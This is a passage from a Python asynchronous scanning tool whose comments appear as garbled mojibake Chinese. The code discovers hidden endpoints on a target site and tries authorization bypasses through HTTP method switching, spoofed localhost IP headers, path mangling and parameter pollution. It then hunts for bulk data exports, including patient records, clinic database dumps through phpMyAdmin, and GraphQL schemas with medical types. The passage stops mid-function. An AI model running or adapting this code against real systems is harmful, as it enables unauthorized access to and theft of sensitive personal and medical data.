        """ä»CSVæ ‡é¢˜æ£€æµ‹æ•æ„Ÿå­—æ®µ"""
        # å°†æ ‡é¢˜åˆ—è¡¨è½¬æ¢ä¸ºå­—å…¸æ ¼å¼è¿›è¡Œæ£€æµ‹
        header_dict = {header: f"sample_{i}" for i, header in enumerate(headers)}
        return self._detect_sensitive_fields(header_dict)

    async def discover_hidden_paths(self):
        """éšè—è·¯å¾„å‘ç° - JSåˆ†æã€å†å²æ•°æ®ã€æºç æ³„éœ²"""
        print("[+] ğŸ•µï¸ éšè—è·¯å¾„å‘ç°...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            discovered_paths = set()
            
            # 1. JSæ–‡ä»¶åˆ†æ
            js_paths = await self._analyze_js_files_for_paths(session)
            discovered_paths.update(js_paths)
            
            # 2. HTMLæ³¨é‡Šå’Œæºç åˆ†æ
            html_paths = await self._analyze_html_comments_for_paths(session)
            discovered_paths.update(html_paths)
            
            # 3. robots.txtå’Œsitemap.xmlåˆ†æ
            robots_paths = await self._analyze_robots_and_sitemap(session)
            discovered_paths.update(robots_paths)
            
            # 4. å†å²æ•°æ®åˆ†æï¼ˆWayback Machine APIï¼‰
            wayback_paths = await self._analyze_wayback_machine(session)
            discovered_paths.update(wayback_paths)
            
            # 5. é”™è¯¯é¡µé¢è·¯å¾„æ³„éœ²
            error_paths = await self._analyze_error_pages_for_paths(session)
            discovered_paths.update(error_paths)
            
            print(f"     å‘ç° {len(discovered_paths)} ä¸ªéšè—è·¯å¾„")
            
            # æµ‹è¯•å‘ç°çš„éšè—è·¯å¾„
            if discovered_paths:
                await self._test_discovered_hidden_paths(session, discovered_paths)

    async def _analyze_js_files_for_paths(self, session):
        """åˆ†æJSæ–‡ä»¶ä¸­çš„è·¯å¾„"""
        print("      åˆ†æJSæ–‡ä»¶...")
        discovered_paths = set()
        
        # è·å–ä¸»é¡µé¢çš„JSæ–‡ä»¶
        try:
            async with session.get(self.target_url, timeout=15) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # æå–JSæ–‡ä»¶è·¯å¾„
                    js_files = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', content, re.I)
                    js_files.extend(re.findall(r'["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', content))
                    
                    # åˆ†ææ¯ä¸ªJSæ–‡ä»¶
                    for js_file in js_files[:10]:  # é™åˆ¶åˆ†ææ•°é‡
                        if js_file.startswith('http') or js_file.startswith('//'):
                            continue  # è·³è¿‡å¤–éƒ¨JSæ–‡ä»¶
                            
                        js_url = urljoin(self.target_url, js_file)
                        js_paths = await self._extract_paths_from_js(session, js_url)
                        discovered_paths.update(js_paths)
                        
        except Exception as e:
            print(f"        JSåˆ†æå¤±è´¥: {e}")
        
        return discovered_paths

    async def _extract_paths_from_js(self, session, js_url):
        """ä»å•ä¸ªJSæ–‡ä»¶æå–è·¯å¾„"""
        paths = set()
        
        try:
            async with session.get(js_url, timeout=10) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # è·¯å¾„æå–æ¨¡å¼
                    path_patterns = [
                        # APIè·¯å¾„
                        r'["\'](/api/[^"\']+)["\']',
                        r'["\'](/rest/[^"\']+)["\']',
                        r'["\'](/services/[^"\']+)["\']',
                        
                        # æŠ¥è¡¨è·¯å¾„
                        r'["\'](/reports?/[^"\']+)["\']',
                        r'["\'](/export/[^"\']+)["\']',
                        r'["\'](/download/[^"\']+)["\']',
                        
                        # ç®¡ç†è·¯å¾„
                        r'["\'](/admin/[^"\']+)["\']',
                        r'["\'](/management/[^"\']+)["\']',
                        r'["\'](/dashboard/[^"\']+)["\']',
                        
                        # GraphQLè·¯å¾„
                        r'["\'](/graphql[^"\']*)["\']',
                        r'["\'](/query[^"\']*)["\']',
                        
                        # éšè—è·¯å¾„
                        r'["\'](/\.[^"\']+)["\']',
                        r'["\'](/~[^"\']+)["\']',
                        r'["\'](/_[^"\']+)["\']',
                        
                        # å¤‡ä»½å’Œä¸´æ—¶è·¯å¾„
                        r'["\'](/backup/[^"\']+)["\']',
                        r'["\'](/temp/[^"\']+)["\']',
                        r'["\'](/tmp/[^"\']+)["\']',
                    ]
                    
                    for pattern in path_patterns:
                        matches = re.findall(pattern, content, re.I)
                        for match in matches:
                            if len(match) > 5 and not any(ext in match for ext in ['.js', '.css', '.png', '.jpg', '.gif']):
                                paths.add(match)
                                
        except Exception:
            pass
        
        return paths

    async def _analyze_html_comments_for_paths(self, session):
        """åˆ†æHTMLæ³¨é‡Šä¸­çš„è·¯å¾„ä¿¡æ¯"""
        print("      åˆ†æHTMLæ³¨é‡Š...")
        discovered_paths = set()
        
        try:
            async with session.get(self.target_url, timeout=15) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # æå–HTMLæ³¨é‡Š
                    comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL | re.I)
                    
                    for comment in comments:
                        # åœ¨æ³¨é‡Šä¸­æŸ¥æ‰¾è·¯å¾„
                        comment_paths = re.findall(r'(/[a-zA-Z0-9/_.-]+)', comment)
                        for path in comment_paths:
                            if (len(path) > 5 and 
                                any(keyword in path.lower() for keyword in ['api', 'admin', 'report', 'export', 'backup', 'temp']) and
                                not any(ext in path for ext in ['.js', '.css', '.png', '.jpg'])):
                                discovered_paths.add(path)
                                
                        # æŸ¥æ‰¾å¼€å‘è€…æ³¨é‡Šä¸­çš„ä¿¡æ¯
                        dev_patterns = [
                            r'TODO[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                            r'FIXME[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                            r'DEBUG[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                            r'TEMP[:\s]+.*?(/[a-zA-Z0-9/_.-]+)',
                        ]
                        
                        for pattern in dev_patterns:
                            matches = re.findall(pattern, comment, re.I)
                            discovered_paths.update(matches)
                            
        except Exception as e:
            print(f"        HTMLæ³¨é‡Šåˆ†æå¤±è´¥: {e}")
        
        return discovered_paths

    async def _analyze_robots_and_sitemap(self, session):
        """åˆ†ærobots.txtå’Œsitemap.xml"""
        print("      åˆ†ærobots.txtå’Œsitemap...")
        discovered_paths = set()
        
        # åˆ†ærobots.txt
        try:
            robots_url = urljoin(self.target_url, '/robots.txt')
            async with session.get(robots_url, timeout=10) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    
                    # æå–Disallowå’ŒAllowè·¯å¾„
                    robot_paths = re.findall(r'(?:Disallow|Allow):\s*([^\s]+)', content, re.I)
                    for path in robot_paths:
                        if path != '/' and len(path) > 3:
                            discovered_paths.add(path.rstrip('*'))
                            
        except Exception:
            pass
        
        # åˆ†æsitemap.xml
        sitemap_urls = ['/sitemap.xml', '/sitemap_index.xml', '/sitemap.txt']
        for sitemap_path in sitemap_urls:
            try:
                sitemap_url = urljoin(self.target_url, sitemap_path)
                async with session.get(sitemap_url, timeout=10) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # æå–URLè·¯å¾„
                        url_paths = re.findall(r'<loc>([^<]+)</loc>', content, re.I)
                        for url in url_paths:
                            parsed = urlparse(url)
                            if parsed.path and len(parsed.path) > 3:
                                discovered_paths.add(parsed.path)
                                
            except Exception:
                continue
        
        return discovered_paths

    async def _analyze_wayback_machine(self, session):
        """åˆ†æWayback Machineå†å²æ•°æ®"""
        print("      åˆ†æå†å²æ•°æ®...")
        discovered_paths = set()
        
        try:
            # è·å–åŸŸå
            domain = urlparse(self.target_url).netloc
            
            # Wayback Machine API
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey&limit=100"
            
            async with session.get(wayback_url, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    for entry in data[1:]:  # è·³è¿‡æ ‡é¢˜è¡Œ
                        if entry and len(entry) > 0:
                            url = entry[0]
                            parsed = urlparse(url)
                            
                            if (parsed.path and len(parsed.path) > 3 and
                                any(keyword in parsed.path.lower() for keyword in 
                                    ['api', 'admin', 'report', 'export', 'backup', 'data', 'download'])):
                                discovered_paths.add(parsed.path)
                                
        except Exception as e:
            print(f"        å†å²æ•°æ®åˆ†æå¤±è´¥: {e}")
        
        return discovered_paths

    async def _analyze_error_pages_for_paths(self, session):
        """åˆ†æé”™è¯¯é¡µé¢ä¸­çš„è·¯å¾„æ³„éœ²"""
        print("      åˆ†æé”™è¯¯é¡µé¢...")
        discovered_paths = set()
        
        # è§¦å‘å„ç§é”™è¯¯é¡µé¢
        error_triggers = [
            '/nonexistent_page_12345',
            '/admin/nonexistent',
            '/api/nonexistent',
            '/reports/nonexistent',
            '/%00',
            '/../',
            '/.//',
        ]
        
        for trigger in error_triggers:
            try:
                error_url = urljoin(self.target_url, trigger)
                async with session.get(error_url, timeout=10) as resp:
                    content = await resp.text()
                    
                    # åœ¨é”™è¯¯é¡µé¢ä¸­æŸ¥æ‰¾è·¯å¾„æ³„éœ²
                    error_paths = re.findall(r'(/[a-zA-Z0-9/_.-]+)', content)
                    for path in error_paths:
                        if (len(path) > 5 and 
                            any(keyword in path.lower() for keyword in ['api', 'admin', 'report', 'config', 'backup']) and
                            not any(ext in path for ext in ['.css', '.js', '.png', '.jpg'])):
                            discovered_paths.add(path)
                            
            except Exception:
                continue
        
        return discovered_paths

    async def _test_discovered_hidden_paths(self, session, paths):
        """æµ‹è¯•å‘ç°çš„éšè—è·¯å¾„"""
        print("      æµ‹è¯•éšè—è·¯å¾„...")
        
        semaphore = asyncio.Semaphore(8)  # æ§åˆ¶å¹¶å‘
        tasks = []
        
        for path in list(paths)[:30]:  # é™åˆ¶æµ‹è¯•æ•°é‡
            tasks.append(self._test_single_hidden_path(session, semaphore, path))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # æ”¶é›†æœ‰æ•ˆå‘ç°
        valid_findings = [r for r in results if r is not None and not isinstance(r, Exception)]
        
        if valid_findings:
            print(f"         å‘ç° {len(valid_findings)} ä¸ªæœ‰æ•ˆéšè—è·¯å¾„")
            self.export_endpoints.extend(valid_findings)

    async def _test_single_hidden_path(self, session, semaphore, path):
        """æµ‹è¯•å•ä¸ªéšè—è·¯å¾„"""
        async with semaphore:
            url = urljoin(self.target_url, path)
            
            try:
                async with session.head(url, timeout=8) as resp:
                    # å™ªéŸ³æ£€æµ‹
                    is_noise, noise_reason = self.is_noise_response(resp)
                    if is_noise:
                        return None
                    
                    if resp.status in [200, 401, 403]:
                        content_type = resp.headers.get('Content-Type', '')
                        content_length = int(resp.headers.get('Content-Length', 0))
                        
                        # è®¡ç®—ä»·å€¼è¯„åˆ†
                        value_score = self._calculate_endpoint_value(path, resp.status, content_type, content_length)
                        
                        if value_score > 35:  # éšè—è·¯å¾„é˜ˆå€¼ç¨ä½
                            return {
                                'url': url,
                                'path': path,
                                'status': resp.status,
                                'content_type': content_type,
                                'size': content_length,
                                'value_score': value_score,
                                'discovered_method': 'hidden_path_discovery'
                            }
                            
            except Exception:
                return None
        
        return None

    async def attempt_bypass_techniques(self):
        """æƒé™ç»•è¿‡å°è¯• - å¤šç§ç»•è¿‡æŠ€å·§"""
        if not self.export_endpoints:
            return
            
        print("[+]  æƒé™ç»•è¿‡å°è¯•...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # é€‰æ‹©éœ€è¦è®¤è¯çš„ç«¯ç‚¹
            auth_required_endpoints = [e for e in self.export_endpoints if e.get('status') in [401, 403]][:5]
            
            for endpoint in auth_required_endpoints:
                print(f"     ç»•è¿‡å°è¯•: {endpoint['path']}")
                bypass_results = await self._attempt_endpoint_bypass(session, endpoint)
                
                if bypass_results:
                    print(f"       ç»•è¿‡æˆåŠŸ!")
                    self.found_reports.extend(bypass_results)

    async def _attempt_endpoint_bypass(self, session, endpoint):
        """å°è¯•ç»•è¿‡å•ä¸ªç«¯ç‚¹çš„æƒé™æ£€æŸ¥"""
        base_url = endpoint['url']
        bypass_results = []
        
        # 1. HTTPæ–¹æ³•ç»•è¿‡
        bypass_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
        for method in bypass_methods:
            try:
                async with session.request(method, base_url, timeout=10) as resp:
                    if resp.status == 200:
                        print(f"         HTTPæ–¹æ³•ç»•è¿‡æˆåŠŸ: {method}")
                        bypass_results.append({
                            'url': base_url,
                            'method': method,
                            'bypass_type': 'http_method',
                            'status': resp.status
                        })
                        break
            except Exception:
                continue
        
        # 2. å¤´éƒ¨ç»•è¿‡
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'Client-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'Cluster-Client-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'Host': 'localhost'},
            {'Referer': urljoin(base_url, '/admin/')},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '192.168.1.1'},
            {'User-Agent': 'Mozilla/5.0 (compatible; internalbot)'},
        ]
        
        for headers in bypass_headers:
            try:
                async with session.get(base_url, headers=headers, timeout=10) as resp:
                    if resp.status == 200:
                        print(f"         å¤´éƒ¨ç»•è¿‡æˆåŠŸ: {list(headers.keys())[0]}")
                        bypass_results.append({
                            'url': base_url,
                            'headers': headers,
                            'bypass_type': 'header_bypass',
                            'status': resp.status
                        })
                        break
            except Exception:
                continue
        
        # 3. è·¯å¾„ç»•è¿‡æŠ€å·§
        bypass_paths = [
            base_url + '/',
            base_url + '/.',
            base_url + '/./',
            base_url + '//',
            base_url + '\\',
            base_url + '%20',
            base_url + '%09',
            base_url + '%2e',
            base_url.replace('/', '%2f'),
            base_url.upper(),
            base_url.lower(),
            # URLç¼–ç ç»•è¿‡
            base_url.replace('/', '%2F'),
            base_url.replace('=', '%3D'),
            base_url.replace('&', '%26'),
        ]
        
        for bypass_url in bypass_paths:
            try:
                async with session.get(bypass_url, timeout=10) as resp:
                    if resp.status == 200:
                        print(f"         è·¯å¾„ç»•è¿‡æˆåŠŸ: {bypass_url}")
                        bypass_results.append({
                            'url': bypass_url,
                            'original_url': base_url,
                            'bypass_type': 'path_manipulation',
                            'status': resp.status
                        })
                        break
            except Exception:
                continue
        
        # 4. å‚æ•°æ±¡æŸ“ç»•è¿‡
        if '?' in base_url:
            base_path, query = base_url.split('?', 1)
            
            pollution_techniques = [
                f"{base_url}&admin=true",
                f"{base_url}&override=true",
                f"{base_url}&bypass=true",
                f"{base_url}&internal=true",
                f"{base_url}&test=true",
                f"{base_url}&debug=true",
                f"{base_url}&force=true",
                f"{base_url}&access_level=admin",
                f"{base_url}&role=administrator",
                f"{base_url}&user=admin",
            ]
            
            for polluted_url in pollution_techniques:
                try:
                    async with session.get(polluted_url, timeout=10) as resp:
                        if resp.status == 200:
                            print(f"         å‚æ•°æ±¡æŸ“ç»•è¿‡æˆåŠŸ")
                            bypass_results.append({
                                'url': polluted_url,
                                'original_url': base_url,
                                'bypass_type': 'parameter_pollution',
                                'status': resp.status
                            })
                            break
                except Exception:
                    continue
        
        # 5. å¤§å°å†™å˜æ¢ç»•è¿‡
        if base_url.count('/') > 3:  # ç¡®ä¿æœ‰è·¯å¾„å¯ä»¥å˜æ¢
            case_variants = [
                base_url.upper(),
                base_url.lower(),
                self._random_case_transform(base_url),
            ]
            
            for variant in case_variants:
                try:
                    async with session.get(variant, timeout=10) as resp:
                        if resp.status == 200:
                            print(f"         å¤§å°å†™ç»•è¿‡æˆåŠŸ")
                            bypass_results.append({
                                'url': variant,
                                'original_url': base_url,
                                'bypass_type': 'case_manipulation',
                                'status': resp.status
                            })
                            break
                except Exception:
                    continue
        
        return bypass_results

    def _random_case_transform(self, url):
        """éšæœºå¤§å°å†™å˜æ¢"""
        import random
        result = ""
        for char in url:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result

    async def detect_bi_systems(self):
        """æ¢æµ‹BIç³»ç»Ÿ"""
        print("[+] æ¢æµ‹BIç³»ç»Ÿ...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            for bi_name, signatures in self.bi_signatures.items():
                for path in signatures['paths']:
                    url = urljoin(self.target_url, path)
                    
                    try:
                        async with session.get(url, timeout=10, allow_redirects=True) as resp:
                            if resp.status in [200, 401, 403]:
                                content = await resp.text()
                                
                                # æ£€æŸ¥ç‰¹å¾
                                found_signatures = []
                                for sig in signatures['files']:
                                    if sig.lower() in content.lower() or sig.lower() in str(resp.url).lower():
                                        found_signatures.append(sig)
                                        
                                if found_signatures or resp.status in [401, 403]:
                                    print(f"[!] å‘ç°{bi_name}ç³»ç»Ÿ: {url}")
                                    self.bi_systems.append({
                                        'name': bi_name,
                                        'url': url,
                                        'status': resp.status,
                                        'signatures': found_signatures
                                    })
                                    
                                    # å¦‚æœæ˜¯401/403ï¼Œå¯èƒ½éœ€è¦è®¤è¯
                                    if resp.status in [401, 403]:
                                        print(f"    éœ€è¦è®¤è¯ (çŠ¶æ€: {resp.status})")
                                        
                    except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                                        
                        logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
    async def discover_report_endpoints(self):
        """å‘ç°æŠ¥è¡¨ç«¯ç‚¹"""
        print("[+] å‘ç°æŠ¥è¡¨ç«¯ç‚¹...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # æµ‹è¯•æŠ¥è¡¨è·¯å¾„
            tasks = []
            
            for path in self.report_paths[0]:  # æ•°é‡
                # æµ‹è¯•ç›®å½•
                tasks.append(self.check_report_path(session, path))
                
                # æµ‹è¯•å…·ä½“æŠ¥è¡¨æ–‡ä»¶
                for filename in self.report_files[:20]:
                    for ext in ['.json', '.csv', '.xlsx', '.pdf', '']:
                        full_path = f"{path}{filename}{ext}"
                        tasks.append(self.check_report_path(session, full_path))
                        
            results = await asyncio.gather(*tasks)
            
            # æ”¶é›†æœ‰æ•ˆç«¯ç‚¹
            valid_endpoints = [r for r in results if r is not None]
            self.export_endpoints.extend(valid_endpoints)
            
            print(f"[+] å‘ç° {len(valid_endpoints)} ä¸ªæŠ¥è¡¨ç«¯ç‚¹")

    async def check_report_path(self, session, path):
        """æ£€æŸ¥æŠ¥è¡¨è·¯å¾„"""
        url = urljoin(self.target_url, path)
        
        try:
            async with session.head(url, timeout=3, allow_redirects=False) as resp:
                if resp.status in [200, 401, 403]:
                    # è·å–æ›´å¤šä¿¡æ¯
                    content_type = resp.headers.get('Content-Type', '')
                    content_length = resp.headers.get('Content-Length', '0')
                    
                    endpoint_info = {
                        'url': url,
                        'path': path,
                        'status': resp.status,
                        'content_type': content_type,
                        'size': int(content_length)
                    }
                    
                    # å¦‚æœæ˜¯æœ‰æ•°æ®çš„å“åº”
                    if resp.status == 200 and int(content_length) > 100:
                        print(f"[!] å‘ç°æŠ¥è¡¨: {path}")
                        
                        # å¦‚æœæ˜¯ç›®å½•åˆ—è¡¨ï¼Œè·å–å†…å®¹
                        if 'text/html' in content_type:
                            async with session.get(url, timeout=10) as get_resp:
                                content = await get_resp.text()
                                
                                # æ£€æŸ¥æ˜¯å¦æ˜¯ç›®å½•åˆ—è¡¨æˆ–æŠ¥è¡¨é¡µé¢
                                if any(indicator in content for indicator in ['Index of', 'Directory listing', 'Report', 'æŠ¥è¡¨', 'ãƒ¬ãƒãƒ¼ãƒˆ']):
                                    # æå–é“¾æ¥
                                    links = re.findall(r'href=["\']([^"\']+)["\']', content)
                                    report_links = [l for l in links if any(ext in l for ext in ['.csv', '.xlsx', '.json', '.pdf', '.xml'])]
                                    
                                    if report_links:
                                        endpoint_info['report_files'] = report_links[:10]
                                        print(f"    æ‰¾åˆ°æŠ¥è¡¨æ–‡ä»¶: {len(report_links)} ä¸ª")
                                        
                        return endpoint_info
                        
                    elif resp.status in [401, 403]:
                        print(f"[?] éœ€è¦è®¤è¯çš„æŠ¥è¡¨: {path}")
                        return endpoint_info
                        
        except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                        
            logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
        return None

    async def test_report_parameters(self):
        """æµ‹è¯•æŠ¥è¡¨å‚æ•°"""
        print("\n[+] æµ‹è¯•æŠ¥è¡¨å‚æ•°...")
        
        if not self.export_endpoints:
            print("[-] æœªå‘ç°æŠ¥è¡¨ç«¯ç‚¹")
            return
            
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # é€‰æ‹©æœ€æœ‰å¸Œæœ›çš„ç«¯ç‚¹
            test_endpoints = [e for e in self.export_endpoints if e['status'] == 200][:5]
            
            for endpoint in test_endpoints:
                print(f"\n[+] æµ‹è¯•ç«¯ç‚¹: {endpoint['path']}")
                
                # æ„é€ å„ç§å‚æ•°ç»„åˆ
                param_combinations = []
                
                # æ—¶é—´èŒƒå›´ç»„åˆ
                param_combinations.append({
                    'date_from': '2020-01-01',
                    'date_to': '2025-6-30',
                    'format': 'json'
                })
                
                param_combinations.append({
                    'start_date': '2020-01-01',
                    'end_date': '2025-6-30',
                    'export': 'true'
                })
                
                # æ‰¹é‡å¯¼å‡º
                param_combinations.append({
                    'type': 'all',
                    'limit': '99999',
                    'format': 'csv'
                })
                
                param_combinations.append({
                    'export_all': 'true',
                    'no_limit': 'true'
                })
                
                # æµ‹è¯•æ¯ä¸ªå‚æ•°ç»„åˆ
                for params in param_combinations:
                    # æ„é€ URL
                    param_str = '&'.join([f"{k}={v}" for k, v in params.items()])
                    test_url = f"{endpoint['url']}?{param_str}"
                    
                    try:
                        async with session.get(test_url, timeout=15) as resp:
                            if resp.status == 200:
                                content_type = resp.headers.get('Content-Type', '')
                                content_length = int(resp.headers.get('Content-Length', 0))
                                
                                # æ£€æŸ¥æ˜¯å¦è¿”å›äº†æ•°æ®
                                if content_length > 1000:  # å¤§äº1KB
                                    print(f"[!] å‚æ•°æœ‰æ•ˆ: {params}")
                                    
                                    # ä¸‹è½½å†…å®¹
                                    content = await resp.read()
                                    
                                    # åˆ†æå†…å®¹
                                    analysis = await self.analyze_report_content(content, content_type, endpoint['path'])
                                    
                                    if analysis['has_data']:
                                        self.found_reports.append({
                                            'endpoint': endpoint['url'],
                                            'params': params,
                                            'content_type': content_type,
                                            'size': content_length,
                                            'analysis': analysis,
                                            'url': test_url
                                        })
                                        
                                        print(f"    [] åŒ…å«æ•°æ®: {analysis['record_count']} æ¡è®°å½•")
                                        
                    except Exception as e:
                        pass

    async def analyze_report_content(self, content, content_type, filename):
        """åˆ†ææŠ¥è¡¨å†…å®¹"""
        analysis = {
            'has_data': False,
            'record_count': 0,
            'data_type': 'unknown',
            'sample_data': None
        }
        
        try:
            # JSONæ ¼å¼
            if 'json' in content_type or filename.endswith('.json'):
                data = json.loads(content)
                
                if isinstance(data, list):
                    analysis['has_data'] = len(data) > 0
                    analysis['record_count'] = len(data)
                    analysis['data_type'] = 'json_array'
                    analysis['sample_data'] = data[:5]
                    
                elif isinstance(data, dict):
                    # æŸ¥æ‰¾æ•°æ®æ•°ç»„
                    for key in ['data', 'results', 'records', 'items', 'patients', 'appointments']:
                        if key in data and isinstance(data[key], list):
                            analysis['has_data'] = len(data[key]) > 0
                            analysis['record_count'] = len(data[key])
                            analysis['data_type'] = f'json_object.{key}'
                            analysis['sample_data'] = data[key][:5]
                            break
                            
                    # æ£€æŸ¥åˆ†é¡µä¿¡æ¯
                    if 'total' in data:
                        analysis['total_records'] = data['total']
                        
            # CSVæ ¼å¼
            elif 'csv' in content_type or filename.endswith('.csv'):
                text = content.decode('utf-8', errors='ignore')
                lines = text.strip().split('\n')
                
                if len(lines) > 1:  # è‡³å°‘æœ‰æ ‡é¢˜å’Œä¸€è¡Œæ•°æ®
                    analysis['has_data'] = True
                    analysis['record_count'] = len(lines) - 1  # å‡å»æ ‡é¢˜è¡Œ
                    analysis['data_type'] = 'csv'
                    
                    # åˆ†æå­—æ®µ
                    headers = lines[0].split(',')
                    analysis['fields'] = headers
                    
                    # æ£€æŸ¥æ˜¯å¦åŒ…å«æ•æ„Ÿå­—æ®µ
                    sensitive_fields = ['name', 'email', 'phone', 'address', 'patient', 'medical']
                    found_sensitive = [h for h in headers if any(s in h.lower() for s in sensitive_fields)]
                    if found_sensitive:
                        analysis['sensitive_fields'] = found_sensitive
                        
            # Excelæ ¼å¼
            elif 'excel' in content_type or 'spreadsheet' in content_type or filename.endswith('.xlsx'):
                # Excelæ–‡ä»¶é€šå¸¸å¾ˆå¤§
                if len(content) > 5000:  # 5KBä»¥ä¸Š
                    analysis['has_data'] = True
                    analysis['data_type'] = 'excel'
                    analysis['file_size'] = len(content)
                    
            # XMLæ ¼å¼
            elif 'xml' in content_type or filename.endswith('.xml'):
                text = content.decode('utf-8', errors='ignore')
                
                # ç®€å•è®¡ç®—è®°å½•æ•°
                record_tags = re.findall(r'<(patient|record|item|row|entry)[\s>]', text, re.I)
                if record_tags:
                    analysis['has_data'] = True
                    analysis['record_count'] = len(record_tags)
                    analysis['data_type'] = 'xml'
                    
        except Exception as e:
            pass
            
        return analysis

    async def attempt_bulk_export(self):
        """å°è¯•æ‰¹é‡å¯¼å‡º"""
        print("\n[+] å°è¯•æ‰¹é‡å¯¼å‡º...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            # æ„é€ æ‰¹é‡å¯¼å‡ºURL
            bulk_export_paths = [
                # ç›´æ¥å¯¼å‡º
                '/export/all', '/export/patients', '/export/data',
                '/download/all', '/download/database', '/backup/download',
                
                # APIå¯¼å‡º
                '/api/export/all', '/api/export?type=all&format=json',
                '/api/v1/export/patients', '/api/bulk-export',
                
                # å¸¦å‚æ•°çš„å¯¼å‡º
                '/reports/export?all=true&format=csv',
                '/data/export?complete=true&no_limit=true',
                '/admin/export?type=full&download=true',
                
                # SQLå¯¼å‡º
                '/phpmyadmin/export.php?db=clinic&table=patients',
                '/adminer.php?export=dump',
                '/db/export.sql', '/database/dump.sql',
                
                # å¤‡ä»½ä¸‹è½½
                '/backup/latest', '/backup/full', '/backup/complete',
                '/downloads/backup.zip', '/downloads/data.tar.gz'
            ]
            
            tasks = []
            for path in bulk_export_paths:
                url = urljoin(self.target_url, path)
                tasks.append(self.check_bulk_export(session, url))
                
            results = await asyncio.gather(*tasks)
            
            # æ”¶é›†æˆåŠŸçš„å¯¼å‡º
            successful_exports = [r for r in results if r is not None]
            
            if successful_exports:
                print(f"[!] å‘ç° {len(successful_exports)} ä¸ªæ‰¹é‡å¯¼å‡º!")
                self.found_reports.extend(successful_exports)

    async def check_bulk_export(self, session, url):
        """æ£€æŸ¥æ‰¹é‡å¯¼å‡º"""
        try:
            async with session.head(url, timeout=3, allow_redirects=True) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get('Content-Type', '')
                    content_length = int(resp.headers.get('Content-Length', 0))
                    
                    # æ£€æŸ¥æ˜¯å¦æ˜¯å¤§æ–‡ä»¶
                    if content_length > 10000:  # 10KBä»¥ä¸Š
                        print(f"[!] å‘ç°æ‰¹é‡å¯¼å‡º: {url}")
                        print(f"    å¤§å°: {self.format_size(content_length)}")
                        print(f"    ç±»å‹: {content_type}")
                        
                        return {
                            'endpoint': url,
                            'type': 'bulk_export',
                            'content_type': content_type,
                            'size': content_length,
                            'url': url
                        }
                        
        except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                        
            logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
        return None

    async def detect_graphql(self):
        """æ¢æµ‹GraphQLç«¯ç‚¹"""
        print("\n[+] æ¢æµ‹GraphQL...")
        
        graphql_paths = [
            '/graphql', '/graphql/', '/api/graphql', '/v1/graphql',
            '/graphiql', '/playground', '/api/playground',
            '/_graphql', '/query', '/api/query'
        ]
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            for path in graphql_paths:
                url = urljoin(self.target_url, path)
                
                # æµ‹è¯•introspectionæŸ¥è¯¢
                introspection_query = {
                    "query": """
                    {
                        __schema {
                            types {
                                name
                                fields {
                                    name
                                    type {
                                        name
                                    }
                                }
                            }
                        }
                    }
                    """
                }
                
                try:
                    async with session.post(
                        url, 
                        json=introspection_query,
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            if 'data' in data and '__schema' in data['data']:
                                print(f"[!] å‘ç°GraphQLç«¯ç‚¹: {url}")
                                
                                # åˆ†æschema
                                types = data['data']['__schema']['types']
                                
                                # æŸ¥æ‰¾æ•°æ®ç±»å‹
                                data_types = []
                                for type_def in types:
                                    type_name = type_def['name'].lower()
                                    if any(keyword in type_name for keyword in ['patient', 'user', 'appointment', 'medical', 'record']):
                                        data_types.append(type_def['name'])
                                        
                                if data_types:
